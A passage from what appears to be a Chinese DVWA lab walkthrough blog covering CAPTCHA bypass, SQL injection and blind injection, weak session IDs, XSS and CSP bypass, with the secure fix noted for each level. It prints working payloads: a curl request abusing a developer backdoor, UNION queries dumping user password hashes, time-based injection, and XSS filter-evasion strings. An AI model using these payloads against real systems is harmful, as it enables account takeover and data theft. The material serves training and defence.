&lt;p&gt;依然很逆天，在 low 的基础上，当 &lt;code&gt;step&lt;/code&gt; 为 1 且验证通过时，重新打开页面，&lt;code&gt;step&lt;/code&gt; 设为 2，并添加一个名为 &lt;code&gt;passed_captcha&lt;/code&gt; 的 hidden input 并设为 true。&lt;/p&gt;
&lt;p&gt;和 low 类似，只要在页面里将 &lt;code&gt;step&lt;/code&gt; 改为 2，添加 &lt;code&gt;passed_captcha&lt;/code&gt;元素即可：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;passed_captcha&amp;quot; value=&amp;quot;true&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;High：开发者留的后门&lt;/h3&gt;
&lt;p&gt;相比前两个等级，high 终于没有使用愚蠢的 &lt;code&gt;step&lt;/code&gt;。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;添加了 CSRF 防护。&lt;/li&gt;
&lt;li&gt;提交后直接验证 reCAPTCHA，如果通过则修改密码。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;然而，在表单的注释里能看到这段内容：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;!-- **DEV NOTE**   Response: &apos;hidd3n_valu3&apos;   &amp;amp;&amp;amp;   User-Agent: &apos;reCAPTCHA&apos;   **/DEV NOTE** --&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;事实上，当这个页面接收到 POST 请求，其中 &lt;code&gt;g-recaptcha-response&lt;/code&gt; 字段为 &lt;code&gt;hidd3n_valu3&lt;/code&gt; 并且 UA 为 &lt;code&gt;reCAPTCHA&lt;/code&gt; 时，会直接视为通过了验证。&lt;/p&gt;
&lt;p&gt;我并没看懂这一关的逻辑，毕竟 reCAPTCHA 验证代码放在独立的模块里。可能意思是开发者留的后门？&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl &apos;http://localhost/vulnerabilities/captcha/&apos; \
  -H &apos;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&apos; \
  -H &apos;Content-Type: application/x-www-form-urlencoded&apos; \
  -H &apos;Cookie: _pk_id.1.1fff=83ca368cc934da2a.1713256286.; pma_lang=zh_CN; phpMyAdmin=211204361d2d8ca74ddb7cf6114904ad; pmaUser-1=yfZDMnTAKyPV7j%2B7cQQNL%2FzQSTP4EIu%2BlPfwwl8x8qc8at35nhtpEyye8Rc%3D; security=high; PHPSESSID=c830c512bdc160d1bd45b89fd12a8f27&apos; \
  -H &amp;quot;User-Agent: reCAPTCHA&amp;quot; \
  --data-raw &apos;step=1&amp;amp;password_new=123456&amp;amp;password_conf=123456&amp;amp;g-recaptcha-response=hidd3n_valu3&amp;amp;user_token=0b419bbb618c37f400efc2b2d03337a9&amp;amp;Change=Change&apos;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Impossible：正常地使用&lt;/h3&gt;
&lt;p&gt;相比前几个等级，这个等级：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;添加表单需要用户输入当前密码，密码正确才能修改密码。&lt;/li&gt;
&lt;li&gt;正常地验证 reCAPTCHA，没有 high 中奇怪的判定。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;说实话，这才是正常人能想到的 reCAPTCHA 使用方式。这关从 low 到 high 感觉都不是正常人能写出来的代码……&lt;/p&gt;
&lt;h2&gt;SQL Injection&lt;/h2&gt;
&lt;p&gt;SQL 注入是老生常谈的安全漏洞。本题提供了一个表单，输入 user id 并提交，能够查询指定 id 的用户，并显示列表。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;攻击者的目标是：&lt;/strong&gt;任意操纵数据库。&lt;/p&gt;
&lt;h3&gt;Low：无防护&lt;/h3&gt;
&lt;p&gt;没有任何 SQL 注入的检测。查询 &lt;code&gt;1&apos; OR 1=1; #&lt;/code&gt;，可以得到所有记录。说明这关的注入是&lt;strong&gt;字符型&lt;/strong&gt;，即输入的内容作为字符串类型。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;确定该表包含字段数量。&lt;/strong&gt;提交 &lt;code&gt;&apos; OR 1=1 ORDER BY 2; #&lt;/code&gt; 正常返回，&lt;code&gt;&apos; OR 1=1 ORDER BY 3; #&lt;/code&gt; 则报错，说明该表共两个字段。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;确定服务器包含的数据库。&lt;/strong&gt;提交 &lt;code&gt;&apos; AND 0=1 UNION SELECT 1,database(); #&lt;/code&gt;，能看到只有 &lt;code&gt;dvwa&lt;/code&gt; 这一个数据库。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;确定数据库包含的所有表。&lt;/strong&gt;提交 &lt;code&gt;&apos; AND 0=1 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=&apos;dvwa&apos;; #&lt;/code&gt; 可以看到所有表的名称，有 users 和 guestbook。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;确定表包含的字段。&lt;/strong&gt;提交 &lt;code&gt;&apos; AND 0=1 UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name=&apos;users&apos;; #&lt;/code&gt; 可以拿到 uses 表包含的所有字段。&lt;/p&gt;
&lt;p&gt;最后就可以想查什么就查什么了。比如用户名和密码的 MD5：&lt;code&gt;&apos; AND 0=1 UNION SELECT user,password FROM users; #&lt;/code&gt;。&lt;/p&gt;
&lt;h3&gt;Medium：字符转义&lt;/h3&gt;
&lt;p&gt;相比 low 等级：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将输入框改为了选择菜单，请求方式改为 POST。但是 POST 接收的参数依然被当作字符串处理。&lt;/li&gt;
&lt;li&gt;对 id 中的字符进行了转义，使用的是 &lt;code&gt;mysqli_real_escape_string&lt;/code&gt; 函数，这个函数会转义 NUL（ASCII 0）、&lt;code&gt;\n&lt;/code&gt;、&lt;code&gt;\r&lt;/code&gt;、&lt;code&gt;\&lt;/code&gt;、&lt;code&gt;&apos;&lt;/code&gt;、&lt;code&gt;&amp;quot;&lt;/code&gt; 和 Control-Z 这些字符。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;尝试 &lt;code&gt;1 OR 1=1;#&lt;/code&gt; 可以判断这题的注入是&lt;strong&gt;数字型&lt;/strong&gt;，即输入内容作为数字类型。那么，不需要用到引号等被过滤的符号。&lt;/p&gt;
&lt;p&gt;直接用和上题一样的方法就好。&lt;/p&gt;
&lt;h3&gt;High：单独的页面&lt;/h3&gt;
&lt;p&gt;这个等级打开一个单独的页面里发送请求，而响应存在后端 SESSION 里，在原来的页面中才显示。这样用 sqlmap 之类的工具进行注入就会比较麻烦，只能自己写脚本或者手工注入。&lt;/p&gt;
&lt;p&gt;不过，除此之外，其他防护措施和 low 等级一样。&lt;/p&gt;
&lt;h3&gt;Impossible：限制数据类型 &amp;amp; 预编译&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;判断 id 是否为数字。&lt;/li&gt;
&lt;li&gt;使用了预编译处理 SQL 语句。这就是「代码与数据分离」。&lt;/li&gt;
&lt;li&gt;CSRF 防护。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;SQL Injection (Blind)&lt;/h2&gt;
&lt;p&gt;SQL 盲注，指的是虽然页面存在 SQL 注入的漏洞，但是我们无法直接看到查询的结果，只能看到成功与否之类非常有限的信息。这大大增加了注入难度。&lt;/p&gt;
&lt;p&gt;这一关就是如此：输入用户 ID，只返回用户 ID 是否存在。这相当于每次只给我们 true 或 false 的信息。&lt;/p&gt;
&lt;p&gt;这一关不同难度增加的限制，和上一关完全一致，只有返回显示结果的区别。所以此处只介绍针对 low 的通用方法。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;猜测是字符型还是整数型。&lt;/strong&gt;尝试 &lt;code&gt;1 AND 1=2; #&lt;/code&gt; 发现能找到记录，&lt;code&gt;1&apos; AND 1=2; #&lt;/code&gt; 则不行，则证明是字符型。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;猜数据库名长度。&lt;/strong&gt;查询 &lt;code&gt;&apos; OR length(database())=4; #&lt;/code&gt; 为真，其他长度都为假，说明当前数据库名长度为 4。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;猜数据库名。&lt;/strong&gt;用诸如 &lt;code&gt;&apos; OR ascii(substr(database(),1,1)&amp;gt;97; #&lt;/code&gt; 这样的查询，可以一个一个字符猜出数据库名（可以用二分）。其他的猜测和以上注入同理。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果程序不返回任何内容，连成功与否都不知道，怎么办呢？&lt;/strong&gt;可以利用&lt;strong&gt;延时&lt;/strong&gt;。例如：&lt;code&gt;&apos; AND sleep 5&lt;/code&gt;。SQL 中的 AND 有和大多数编程语言一样的短路运算，当 AND 左侧为 false 则不计算右侧。如果能找到记录，会等待五秒才返回；如果找不到记录，则会立即返回。通过这种方式我们相当于也获得了 true 或 false 的反馈信息。&lt;/p&gt;
&lt;h2&gt;Weak Session IDs&lt;/h2&gt;
&lt;p&gt;这个场景只提供一个按钮，每次点击就能生成或更新本地名为 dvwaSession 的 Cookie。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;攻击者的目标：&lt;/strong&gt;猜测下一次生成的 dvwaSession，或者猜测其他用户生成的 dvwaSession。Session 一般作为用户身份的凭证，如果能够猜到其生成方式，往往能够伪造他人身份。&lt;/p&gt;
&lt;h3&gt;Low：简单计数器&lt;/h3&gt;
&lt;p&gt;非常简单直白的方式生成 dvwaSession：第一次生成 1，之后每次重新生成就加 1。这种方式太容易伪造了。&lt;/p&gt;
&lt;h3&gt;Medium：时间戳&lt;/h3&gt;
&lt;p&gt;将时间戳作为 dvwaSession。时间戳没有随机性并且可预知，攻击者也完全可以伪造。&lt;/p&gt;
&lt;h3&gt;High：计数器 MD5 &amp;amp; 访问限制&lt;/h3&gt;
&lt;p&gt;这一等级仍然使用计数器作为 dvwaSession，不同之处在于存入 Cookie 时用 MD5 哈希了一下。计数器每次加 1，所以不会很大，可以轻易枚举出哈希前的计数器。&lt;/p&gt;
&lt;p&gt;这一等级还设定了 Cookie 的失效时间为一小时，指定只能在 &lt;code&gt;/vulnerabilities/weak_id/&lt;/code&gt; 路径以及当前域名下使用，&lt;/p&gt;
&lt;p&gt;Cookie 的 secure、httpOnly 选项都设为 false，这意味着 Cookie 可以在非 HTTPS 连接下使用、可以被 JavaScript 脚本访问。这是不安全的设置。&lt;/p&gt;
&lt;h3&gt;Impossible：随机化 &amp;amp; 强限制&lt;/h3&gt;
&lt;p&gt;在 high 的基础上：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用时间戳、随机数，用 SHA1 算法生成 Cookie。这确保了充分的 Cookie 随机化。&lt;/li&gt;
&lt;li&gt;secure、httpOnly 选项都设为 true。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;相比 high，这个等级：1）无法枚举预测 Cookie；2）有更严格的访问限制。&lt;/p&gt;
&lt;h2&gt;DOM Based Cross Site Scripting (XSS)&lt;/h2&gt;
&lt;p&gt;在做 XSS 的三个关卡之前，回顾之前 &lt;a href=&quot;https://skywt.cn/blog/xss-labs-tutorial/#总结&quot;&gt;xss-labs 的题解&lt;/a&gt;，执行 JavaScript 代码一般有四种方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; 标签。&lt;/li&gt;
&lt;li&gt;通过元素的 onmouseover 属性。&lt;/li&gt;
&lt;li&gt;通过 &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; 的 onerror 属性，如 &lt;code&gt;&amp;lt;img src=1 onerror=&amp;quot;alert(1)&amp;quot;&amp;gt;&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;通过 URI，如 &lt;code&gt;javascript:alert(1)&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这一关提供了一个包含下拉选择框的表单，提供了若干语言选项。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;攻击者的目标是：&lt;/strong&gt;实现 XSS 注入，执行我们想要的 JavaScript 脚本。&lt;/p&gt;
&lt;h3&gt;Low：虚假的下拉框&lt;/h3&gt;
&lt;p&gt;选择 &lt;code&gt;English&lt;/code&gt; 并 Submit，可以发现 &lt;code&gt;English&lt;/code&gt; 作为字符串传进了 URL，作为 &lt;code&gt;default&lt;/code&gt; 的值。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://localhost/vulnerabilities/xss_d/?default=English
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将 URL 中 &lt;code&gt;English&lt;/code&gt; 改为 &lt;code&gt;test&lt;/code&gt;，会发现页面里下拉框中文本也变成了 &lt;code&gt;test&lt;/code&gt;。显然这个下拉框只是个幌子，&lt;code&gt;default&lt;/code&gt; 的值不仅限于这四种语言。&lt;/p&gt;
&lt;p&gt;可以发现表单中有一段脚本用于处理 &lt;code&gt;default&lt;/code&gt; 的值，使用了非常愚蠢的 &lt;code&gt;document.write&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;if (document.location.href.indexOf(&amp;quot;default=&amp;quot;) &amp;gt;= 0) {
  var lang = document.location.href.substring(document.location.href.indexOf(&amp;quot;default=&amp;quot;)+8);
  document.write(&amp;quot;&amp;lt;option value=&apos;&amp;quot; + lang + &amp;quot;&apos;&amp;gt;&amp;quot; + decodeURI(lang) + &amp;quot;&amp;lt;/option&amp;gt;&amp;quot;);
  document.write(&amp;quot;&amp;lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&amp;gt;----&amp;lt;/option&amp;gt;&amp;quot;);
}
document.write(&amp;quot;&amp;lt;option value=&apos;English&apos;&amp;gt;English&amp;lt;/option&amp;gt;&amp;quot;);
document.write(&amp;quot;&amp;lt;option value=&apos;French&apos;&amp;gt;French&amp;lt;/option&amp;gt;&amp;quot;);
document.write(&amp;quot;&amp;lt;option value=&apos;Spanish&apos;&amp;gt;Spanish&amp;lt;/option&amp;gt;&amp;quot;);
document.write(&amp;quot;&amp;lt;option value=&apos;German&apos;&amp;gt;German&amp;lt;/option&amp;gt;&amp;quot;);               
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;那么，将 &lt;code&gt;default&lt;/code&gt; 的值改为 &lt;code&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt; 进行 encodeURI 之后的值，即可成功出现弹窗：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;%3Cscript%3Ealert(1)%3C/script%3E
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Medium：后端过滤 script 标签&lt;/h3&gt;
&lt;p&gt;相比 low，在后端添加了检测，如果 URL 的 &lt;code&gt;default&lt;/code&gt; 值包含 &lt;code&gt;&amp;lt;script&lt;/code&gt; 字串，则强制设置为 &lt;code&gt;English&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;当然，引入 JavaScript 代码的方式并不止 script 标签一种。比如：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;/option&amp;gt;&amp;lt;/select&amp;gt;&amp;lt;button onclick=&apos;alert(1)&apos;&amp;gt;&amp;lt;/button&amp;gt;
&amp;lt;/option&amp;gt;&amp;lt;/select&amp;gt;&amp;lt;div onmouseover=&apos;alert(1)&apos; style=&apos;height: 1000px; width: 1000px&apos;&amp;gt;&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这段代码将 select 组件闭合，并插入一个其他元素，能够触发弹窗。button 需要点击触发，而插入一个很大的 div 则用户鼠标经过就触发。经过实测，因为这个 div 很大，还是非常容易触发的……&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;⚠️ 浏览器的安全限制：&lt;/strong&gt;由于 &lt;code&gt;document.write&lt;/code&gt; 存在较多安全问题，已经是强烈不建议使用的方法（参见 &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Document/write&quot;&gt;MDN 文档&lt;/a&gt;），许多浏览器对其添加了诸多限制，例如 Chrome 浏览器的&lt;a href=&quot;https://developer.chrome.com/blog/removing-document-write/#catch_warnings_in_chrome_devtools&quot;&gt;这篇文档&lt;/a&gt;。所以，这一关很多更好的方法都无法使用，比如 &lt;code&gt;&amp;lt;img src=1 onerror=&apos;alert(1)&apos;&amp;gt;&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;（除了这种方法之外，使用下述 high 等级的方法也能通过这一关）&lt;/p&gt;
&lt;h3&gt;High：后端白名单，但前端简单粗暴&lt;/h3&gt;
&lt;p&gt;相比 medium，这关在后端直接使用了白名单：&lt;code&gt;default&lt;/code&gt; 参数对应的值只能是 &lt;code&gt;English&lt;/code&gt; 等四个值中的一种。其他情况，就重定向到 &lt;code&gt;default=English&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;不过，或许你已经注意到了，前端获取 &lt;code&gt;default&lt;/code&gt; 对应的值的这段代码，非常简单粗暴：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;if (document.location.href.indexOf(&amp;quot;default=&amp;quot;) &amp;gt;= 0) {
  var lang = document.location.href.substring(document.location.href.indexOf(&amp;quot;default=&amp;quot;)+8);
  // ...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;直接搜索 URL 中 &lt;code&gt;default=&lt;/code&gt; 这个字串，不管三七二十一，将等号之后的内容都视为 lang 的值。然而，我们知道如果后面又有别的参数（例如 &lt;code&gt;default=English&amp;amp;param=test&lt;/code&gt;），这个参数也会被放进 lang 里，但会被后端忽略。&lt;/p&gt;
&lt;p&gt;所以只要加个 &lt;code&gt;&amp;amp;&lt;/code&gt; 就能避免后端的检测了：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;English&amp;amp;%3Cscript%3Ealert(1)%3C/script%3E
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Impossible：前端不要 decode&lt;/h3&gt;
&lt;p&gt;之前从 low 到 high 的前端代码都犯了非常蠢的错误：直接将拿到的 lang 进行 decode 并在前端展示出来（&lt;code&gt;decodeURI(lang)&lt;/code&gt;）。&lt;/p&gt;
&lt;p&gt;事实上，对于 &lt;code&gt;English&lt;/code&gt; 等四个选项，其中并不包含任何特殊字符，完全不需要 decode。只要不 decode，攻击者就不可能注入任何特殊字符了。Impossible 就改写了这一点：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;if (document.location.href.indexOf(&amp;quot;default=&amp;quot;) &amp;gt;= 0) {
  // ...
  document.write(&amp;quot;&amp;lt;option value=&apos;&amp;quot; + lang + &amp;quot;&apos;&amp;gt;&amp;quot; + (lang) + &amp;quot;&amp;lt;/option&amp;gt;&amp;quot;);
  // ...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;不过，这个选项仍然不是最好的解决方案，因为使用了 &lt;code&gt;document.write&lt;/code&gt; 等非常不优雅的写法，并且用户仍然可能传入非预期的字符串（虽然不可能进行 XSS 攻击了）。如果让我来设计，或许我会将选项从 0 开始编号，URL 中只允许用户传入一个数字编号，在前端将其换成对应的选项。&lt;/p&gt;
&lt;h2&gt;Reflected Cross Site Scripting (XSS)&lt;/h2&gt;
&lt;p&gt;这一关提供一个表单，让我们输入名字。当点击提交后，名字会通过 &lt;code&gt;name&lt;/code&gt; 这个 param 传送给页面，表单下方会展示「Hello xxx」。&lt;/p&gt;
&lt;h3&gt;Low：无防护&lt;/h3&gt;
&lt;p&gt;没有任何防护。&lt;/p&gt;
&lt;p&gt;输入 &lt;code&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt; 并提交，这段代码被原封不动地写入 HTML，就能成功弹窗。&lt;/p&gt;
&lt;h3&gt;Medium：子串替换&lt;/h3&gt;
&lt;p&gt;后端进行了防护：将输入包含的所有 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; 子串替换为空串。&lt;/p&gt;
&lt;p&gt;和 File Inclusion 里的 medium 解法相同，可以通过双写的方式规避：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;sc&amp;lt;script&amp;gt;ript&amp;gt;alert(1)&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用下文所述 high 的方法也能解决。&lt;/p&gt;
&lt;h3&gt;High：正则表达式替换&lt;/h3&gt;
&lt;p&gt;相比 medium，这次通过正则表达式替换了 &lt;code&gt;&amp;lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t&lt;/code&gt;，使用双写的方法无效了。&lt;/p&gt;
&lt;p&gt;同前所述，script 并非引入 JavaScript 的唯一方式。也可以使用：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;img src=1 onerror=&amp;quot;alert(1)&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Impossible：htmlspecialchars&lt;/h3&gt;
&lt;p&gt;相比 high 等级，这个等级：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;增加了 CSRF 防护。&lt;/li&gt;
&lt;li&gt;通过 &lt;code&gt;htmlspecialchars&lt;/code&gt; 转义输入字符串。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一般来说，为了防范 XSS，使用 PHP 内置的 &lt;code&gt;htmlspecialchars&lt;/code&gt; 函数转义字符串，是最优解。&lt;/p&gt;
&lt;h2&gt;Stored Cross Site Scripting (XSS)&lt;/h2&gt;
&lt;p&gt;本题场景是一个类似留言板的功能，提供一个表单，可以填写姓名和文本，提交后填写的内容将被存储，在留言列表中展示出来。&lt;/p&gt;
&lt;h3&gt;Low：无防护&lt;/h3&gt;
&lt;p&gt;在 message 中填入 &lt;code&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt; 提交，该内容会被原封不动地注入 HTML 导致弹窗。&lt;/p&gt;
&lt;p&gt;这一关卡所有难度都使用了 &lt;code&gt;mysqli_real_escape_string&lt;/code&gt; 过滤了输入，从而防止 SQL 注入攻击。由于 SQL 注入不是本关卡的重点，与 XSS 无关，下面暂时不考虑。&lt;/p&gt;
&lt;h3&gt;Medium：name 子串替换&lt;/h3&gt;
&lt;p&gt;相比 low，这一关在后端对 name 和 message 分别进行了过滤：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对于 message：使用 PHP 的 &lt;code&gt;strip_tags&lt;/code&gt; 函数去除所有 HTML 和 PHP 标签，然后使用 &lt;code&gt;htmlspecialchars&lt;/code&gt; 函数转义存储。&lt;/li&gt;
&lt;li&gt;对于 name：将所有 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; 标签替换为空。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;很显然，对 name 的处理存在和上一关（反射型 XSS）一样的问题，可以双写 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; 或者使用 img 标签。&lt;/p&gt;
&lt;p&gt;对于 name 输入框的长度限制，直接在浏览器里修改该元素的 maxlength 属性即可。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;scr&amp;lt;script&amp;gt;ipt&amp;gt;alert(1)&amp;lt;/script&amp;gt;
&amp;lt;img src=1 onerror=&amp;quot;alert(1)&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;High：name 正则表达式替换&lt;/h3&gt;
&lt;p&gt;和反射型 XSS 里一样，将处理 name 字段时的 &lt;code&gt;str_replace&lt;/code&gt; 子串替换，换成了基于正则表达式的替换。双写不能用了，但是 img 还是可以用：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;img src=1 onerror=&amp;quot;alert(1)&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Impossible：htmlspecialchars&lt;/h3&gt;
&lt;p&gt;相比 high 等级，这个等级：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;增加了 CSRF 防护。&lt;/li&gt;
&lt;li&gt;通过 &lt;code&gt;htmlspecialchars&lt;/code&gt; 转义 name。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;存储型 XSS 这一关和反射型非常类似。最佳安全实践也一样：使用 &lt;code&gt;htmlspecialchars&lt;/code&gt;。&lt;/p&gt;
&lt;h2&gt;Content Security Policy (CSP) Bypass&lt;/h2&gt;
&lt;p&gt;浏览器的内容安全策略，是可以在 Content-Security-Policy 相应头中定义的一系列规则，告诉浏览器在访问内容时应该添加何种限制。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;攻击者的目标是：&lt;/strong&gt;通过 script 标签，引入外部脚本。&lt;/p&gt;
&lt;h3&gt;Low：引用 script 的限制&lt;/h3&gt;
&lt;p&gt;这一等级给出一个表单，提交的 URL 会被作为 script 的 src 引入。&lt;/p&gt;
&lt;p&gt;这一等级的 Content-Security-Policy 请求头内容如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Content-Security-Policy: script-src &apos;self&apos; https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com https://digi.ninja;
// allows js from self, pastebin.com, hastebin.com, jquery, digi.ninja, and google analytics.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;页面给出了五个测试链接：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;alert.js&lt;/code&gt;：成功引用&lt;/li&gt;
&lt;li&gt;&lt;code&gt;alert.txt&lt;/code&gt;：无法引用&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cookie.js&lt;/code&gt;：成功引用&lt;/li&gt;
&lt;li&gt;&lt;code&gt;forced_download.js&lt;/code&gt;：无法引用&lt;/li&gt;
&lt;li&gt;&lt;code&gt;wrong_content_type.js&lt;/code&gt;：无法引用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;网页引入的 script 脚本，要满足如下限制：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;MIME 必须是 &lt;code&gt;text/javascript&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;相应头不能包含 &lt;code&gt;Content-Disposition: attachment&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Medium：不变的 nonce&lt;/h3&gt;
&lt;p&gt;这一等级给出一个表单，提交的内容会被直接插入 HTML 中，且关闭了 XSS 防护。&lt;/p&gt;
&lt;p&gt;该等级的 Content-Security-Policy 请求头：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Content-Security-Policy: script-src &apos;self&apos; &apos;unsafe-inline&apos; &apos;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&apos;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;请求头里包含了 nonce。nonce 后加一个 base64 编码后的字符串。添加这一限制后，所有 script 都必须带上相同的 nonce，否则浏览器就拒绝执行。&lt;/p&gt;
&lt;p&gt;然而，这一等级中 nonce 并不是每次随机生成的，而是一个固定的字符串 &lt;code&gt;Tm...XA=&lt;/code&gt;。事实上，base64 解码之后内容是：「Never going to give you up」……&lt;/p&gt;
&lt;p&gt;只要提交这样的一段 script 即可：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;script nonce=&amp;quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&amp;quot;&amp;gt;alert(1)&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;High：JSONP&lt;/h3&gt;
&lt;p&gt;这一等级中，页面调用 &lt;code&gt;jsonp.php&lt;/code&gt; 执行代码。&lt;/p&gt;
&lt;p&gt;JSONP（JSON with Padding）是一种跨域请求的技术，动态创建 script 标签，并将跨域请求到的资源当作 JavaScript 代码执行。&lt;/p&gt;
&lt;p&gt;可以看到这个页面中 button 绑定的回调函数：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;function clickButton() {
    var s = document.createElement(&amp;quot;script&amp;quot;);
    s.src = &amp;quot;source/jsonp.php?callback=solveSum&amp;quot;;
    document.body.appendChild(s);
}

function solveSum(obj) {
    if (&amp;quot;answer&amp;quot; in obj) {
        document.getElementById(&amp;quot;answer&amp;quot;).innerHTML = obj[&apos;answer&apos;];
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;jsonp.php&lt;/code&gt; 脚本内容如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
header(&amp;quot;Content-Type: application/json; charset=UTF-8&amp;quot;);

if (array_key_exists (&amp;quot;callback&amp;quot;, $_GET)) {
    $callback = $_GET[&apos;callback&apos;];
} else {
    return &amp;quot;&amp;quot;;
}

$outp = array (&amp;quot;answer&amp;quot; =&amp;gt; &amp;quot;15&amp;quot;);

echo $callback . &amp;quot;(&amp;quot;.json_encode($outp).&amp;quot;)&amp;quot;;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当传入 callback 参数为 &lt;code&gt;solveSum&lt;/code&gt;，&lt;code&gt;jsonp.php&lt;/code&gt; 将构造一段 JavaScript 代码，这段代码用指定的参数调用 &lt;code&gt;solveSum&lt;/code&gt;。即：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;solveSum({answer: 15})
&lt;/code&gt;&lt;/pre&gt;
